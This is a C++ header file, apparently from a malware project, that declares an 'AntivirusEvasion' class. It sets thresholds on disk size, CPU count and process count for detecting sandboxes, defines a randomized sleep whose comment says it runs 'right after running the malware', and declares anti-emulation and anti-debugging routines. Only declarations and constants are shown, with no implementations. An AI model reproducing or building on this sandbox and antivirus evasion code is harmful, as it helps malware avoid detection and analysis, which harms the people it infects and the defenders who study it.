#pragma once

// Antiforensics configuration
#define MIN_HD_SIZE 40 // In GB
#define MIN_CPU_COUNT 2
#define ANTIFORESIC_SLEEP_TIME_MIN 6 // Sleep X seconds right after runnig the malware. Cant be 0 in Windows
#define ANTIFORESIC_SLEEP_TIME_MAX 12
#define MIN_PROC_COUNT 30

class AntivirusEvasion {
private:
#ifdef _WIN32
    static void sleep_antiemulation_windows(int seconds);
#endif
#if defined(__APPLE__) || defined(__linux__)
    static void sleep_antiemulation_unix(int seconds);
#endif
    static void sleep_antiemulation(int seconds);
    static void sleep_antiemulation_interval(int min_seconds, int max_seconds);
    static int HD_capacity_anitforensics_check();
    static int cpu_antiforensics_check();
    static int proccesses_count_check();
    static void preventDebugging();
    static int misc_check();
public:
    static int run_antiforensics();
};